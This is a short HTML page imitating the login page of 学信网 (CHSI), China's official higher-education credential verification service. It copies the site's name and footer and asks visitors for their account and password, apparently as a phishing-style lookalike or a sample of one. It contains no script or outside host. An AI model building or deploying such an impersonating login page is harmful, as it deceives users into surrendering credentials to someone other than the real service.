<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>学信网-学历查询认证中心</title>
<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f0f5fa;color:#333}
header{background:#1a5b9e;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:24px}
.logo{font-size:24px;font-weight:700;letter-spacing:2px}
.card{margin:36px auto;width:430px;background:#fff;border-radius:8px;padding:30px;box-shadow:0 2px 10px #0001}
.card h2{margin:0 0 6px;font-size:20px;color:#1a5b9e}.card p{margin:0 0 16px;font-size:13px;color:#999}
label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
button{width:100%;height:42px;margin-top:18px;background:#1a5b9e;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
<body><header><span class="logo">学信网</span><span>学历查询认证中心</span></header>
<div class="card"><h2>学历认证查询</h2><p>请登录后查询学历证书真伪</p>
<form action="/chsi/query" method="post">
<label>学信网账号</label><input placeholder="手机号/邮箱">
<label>密码</label><input type="password" placeholder="请输入密码">
<button type="submit">查询认证</button></form></div>
<footer>© 学信网 · 中国高等教育学生信息网</footer></body></html>
